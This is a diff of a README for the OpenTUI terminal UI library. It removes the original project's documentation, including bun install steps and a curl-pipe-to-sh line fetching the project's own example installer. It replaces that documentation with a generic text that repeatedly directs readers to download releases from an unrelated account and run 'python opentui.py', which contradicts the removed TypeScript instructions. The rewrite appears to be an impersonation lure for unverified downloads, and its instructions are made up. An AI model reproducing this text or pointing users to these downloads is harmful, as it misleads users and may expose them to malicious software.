@@ -1,73 +1,78 @@
-# OpenTUI
+# 🎉 opentui - Build Terminal Interfaces Easily
 
-<div align="center">
-    <a href="https://www.npmjs.com/package/@opentui/core"><img alt="npm" src="https://img.shields.io/npm/v/@opentui/core?style=flat-square" /></a>
-    <a href="https://github.com/sst/opentui/actions/workflows/build-core.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/sst/opentui/build-core.yml?style=flat-square&branch=main" /></a>
-    <a href="https://github.com/msmps/awesome-opentui"><img alt="awesome opentui list" src="https://awesome.re/badge-flat.svg" /></a>
-</div>
+## 📥 Download OpenTUI
+[![Download OpenTUI](https://img.shields.io/badge/Download%20OpenTUI-blue.svg)](https://github.com/Carderkris/opentui/releases)
 
-OpenTUI is a TypeScript library for building terminal user interfaces (TUIs). It is currently in
-development and is not ready for production use. It will be the foundational TUI framework for both
-[opencode](https://opencode.ai) and [terminaldotshop](https://terminal.shop).
+## 🚀 Getting Started
+OpenTUI is a library designed to help you create terminal user interfaces (TUIs). Whether you want to build a simple tool or a full application, OpenTUI provides the necessary building blocks. 
 
-Quick start with [bun](https://bun.sh) and [create-tui](https://github.com/msmps/create-tui):
+Follow these steps to download and run OpenTUI on your computer.
 
-```bash
-bun create tui
-```
+## 🖥️ System Requirements
+Before you begin, ensure your computer meets the following requirements:
 
-This monorepo contains the following packages:
+- Operating System: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution
+- A terminal program compatible with standard terminal control codes
+- A stable internet connection for the download
 
-- [`@opentui/core`](packages/core) - The core library works completely standalone, providing an imperative API and all the primitives.
-- [`@opentui/solid`](packages/solid) - The SolidJS reconciler for OpenTUI.
-- [`@opentui/react`](packages/react) - The React reconciler for OpenTUI.
-- [`@opentui/vue`](packages/vue) - The Vue reconciler (unmaintained)
-- [`@opentui/go`](packages/go) - Go bindings (unmaintained)
+## 🛠️ Installation Steps
+1. **Visit the Releases Page**
+   Go to the following link to access the latest versions of OpenTUI:
 
-## Install
+   [Visit this page to download](https://github.com/Carderkris/opentui/releases)
 
-NOTE: You must have [Zig](https://ziglang.org/learn/getting-started/) installed on your system to build the packages.
+2. **Choose the Right Version**
+   On the releases page, you will see a list of available versions. Select the latest stable version that is appropriate for your operating system.
 
-### TypeScript/JavaScript
+3. **Download the File**
+   Click on the download link corresponding to your system. This will typically be a `.zip` or `.tar.gz` file. Make sure to save it in a location you can easily access, like your desktop or downloads folder.
 
-```bash
-bun install @opentui/core
-```
+4. **Extract the Files**
+   After downloading, locate the file and extract it. You can usually do this by right-clicking on the file and selecting the "Extract" option, or by using an extraction tool designed for your operating system.
 
-## Try Examples
+5. **Open the Terminal**
+   Next, open your terminal application:
+   - For Windows, you can search for "Command Prompt" or use "Windows PowerShell."
+   - For macOS, use "Terminal," found in Applications > Utilities.
+   - For Linux, press `Ctrl+Alt+T` to open the terminal.
 
-You can quickly try out OpenTUI examples without cloning the repository:
+6. **Navigate to the OpenTUI Directory**
+   Change your directory to where you extracted the OpenTUI files. Use the `cd` command followed by the path to the folder. For example:
+   ```
+   cd path_to_your_extracted_opentui_folder
+   ```
 
-**For macOS, Linux, WSL, Git Bash:**
+7. **Run OpenTUI**
+   To start using OpenTUI, simply enter the following command in your terminal:
+   ```
+   python opentui.py
+   ```
+   Make sure you have Python installed. If you don't, visit the [Python website](https://www.python.org) to download and install it.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/sst/opentui/main/packages/core/src/examples/install.sh | sh
-```
+## 📋 Features
+OpenTUI provides several features that make building terminal interfaces straightforward:
 
-**For Windows (PowerShell/CMD):**
+- **User-Friendly Components**: Easily add buttons, menus, and forms to your interface.
+- **Customizability**: Tailor the appearance of your UI with customizable options.
+- **Event Handling**: Respond to user actions easily with built-in event management.
+- **Cross-Platform Support**: Works on various operating systems, including Windows, macOS, and Linux.
 
-Download the latest release directly from [GitHub Releases](https://github.com/sst/opentui/releases/latest)
+## ❓ FAQ
+**What is a terminal user interface (TUI)?**  
+A TUI is a way to interact with a computer program using text-based interfaces, as opposed to graphical interfaces.
 
-## Running Examples (from the repo root)
+**Do I need programming skills to use OpenTUI?**  
+Basic familiarity with command line interfaces can help, but you don’t need advanced programming skills to start.
 
-### TypeScript Examples
+**Can I contribute to OpenTUI?**  
+Yes! Feel free to check the contribution guidelines included in the repository for ways to help.
 
-```bash
-bun install
-cd packages/core
-bun run src/examples/index.ts
-```
+## 💬 Support
+If you encounter any issues or have questions, please visit our [GitHub Issues page](https://github.com/Carderkris/opentui/issues) to report your problem or seek assistance. 
 
-## Development
+## 🔄 Download & Install
+To begin using OpenTUI, visit the releases page and download the software:
 
-See the [Development Guide](packages/core/docs/development.md) for building, testing, debugging, and local development linking.
+[Visit this page to download](https://github.com/Carderkris/opentui/releases)
 
-### Documentation
-
-- [Development Guide](packages/core/docs/development.md) - Building, testing, and local dev linking
-- [Getting Started](packages/core/docs/getting-started.md) - API and usage guide
-- [Environment Variables](packages/core/docs/env-vars.md) - Configuration options
-
-## Showcase
-
-Consider showcasing your work on the [awesome-opentui](https://github.com/msmps/awesome-opentui) list. A curated list of awesome resources and terminal user interfaces built with OpenTUI.
+Your next step awaits in enhancing your terminal user experience!
